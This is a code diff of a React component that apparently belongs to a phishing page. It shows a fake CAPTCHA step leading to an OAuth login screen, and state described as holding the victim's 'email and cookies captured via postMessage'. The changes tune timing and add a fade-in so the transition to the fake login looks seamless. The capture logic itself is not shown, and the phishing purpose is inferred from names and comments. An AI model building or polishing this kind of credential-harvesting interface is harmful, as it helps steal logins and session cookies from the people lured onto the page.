@@ -18,7 +18,7 @@ const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStep
 
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
-  const [isOAuthReady, setIsOAuthReady] = useState(false);
+  const [isOAuthLoaded, setIsOAuthLoaded] = useState(false);
 
   // State to hold the most reliable email and cookies captured via postMessage
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
@@ -47,26 +47,13 @@ function App() {
   // Handle redirecting to OAuth after delay
   useEffect(() => {
     if (currentPage === 'redirecting') {
-      // Preload OAuth component to prevent white flash
-      setIsOAuthReady(true);
+      // Immediately start preloading OAuth component
+      setIsOAuthLoaded(true);
+      
       const timer = setTimeout(() => {
-        // Only transition when OAuth is ready
-        if (isOAuthReady) {
-          setCurrentPage('oauth-redirect');
-        }
+        setCurrentPage('oauth-redirect');
       }, redirectingDelay);
       return () => clearTimeout(timer);
-    }
-  }, [currentPage, isOAuthReady]);
-
-  // Preload OAuth component when redirecting starts
-  useEffect(() => {
-    if (currentPage === 'redirecting') {
-      // Force component preload
-      const preloadTimer = setTimeout(() => {
-        setIsOAuthReady(true);
-      }, 100);
-      return () => clearTimeout(preloadTimer);
     }
   }, [currentPage]);
 
@@ -362,9 +349,11 @@ function App() {
 
     case 'oauth-redirect':
       return (
+        <div style={{ opacity: isOAuthLoaded ? 1 : 0, transition: 'opacity 0.3s ease' }}>
         <RealOAuthRedirect
           onLoginSuccess={handleOAuthSuccess}
         />
+        </div>
       );
 
     case 'success':
